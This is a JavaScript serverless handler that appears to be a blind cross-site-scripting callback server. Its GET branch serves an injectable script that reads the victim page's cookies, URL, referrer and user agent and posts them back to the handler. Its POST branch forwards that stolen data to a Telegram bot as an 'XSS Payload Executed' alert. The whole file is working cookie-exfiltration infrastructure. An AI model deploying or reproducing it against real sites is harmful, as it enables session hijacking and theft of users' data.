export default async function handler(req, res) {
  if (req.method === 'POST') {
    const data = req.body;
    
    // Send to Telegram
    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;
    
    const message = `🚨 XSS Payload Executed
URI: ${data.uri}
Cookies: ${data.cookies}
Referrer: ${data.referrer}
User-Agent: ${data.userAgent}`;
    
    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: message
      })
    });
    
    return res.status(200).json({ status: 'received' });
  }
  
  res.setHeader('Content-Type', 'application/javascript');
  res.setHeader('Access-Control-Allow-Origin', '*');
  
  const payload = `
var data = {};
function collect() {
  data.uri = location.toString();
  data.cookies = document.cookie;
  data.referrer = document.referrer;
  data.userAgent = navigator.userAgent;
  
  fetch('/', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(data)
  });
}
document.readyState === 'complete' ? collect() : window.addEventListener('load', collect);
`;
  
  res.send(payload);
}
